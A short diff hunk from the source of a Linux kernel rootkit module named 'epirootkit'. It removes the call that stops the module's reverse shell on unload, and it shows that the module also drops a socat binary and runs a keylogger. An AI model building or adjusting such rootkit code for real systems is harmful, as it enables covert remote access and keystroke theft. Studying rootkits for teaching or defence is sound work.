@@ -71,7 +71,6 @@ static int __init epirootkit_init(void){
  * This function is executed during the module's exit phase. 
  */
 static void __exit epirootkit_exit(void){
-	stop_reverse_shell();
 	remove_socat_binaire();
 
 	// stop keylogger
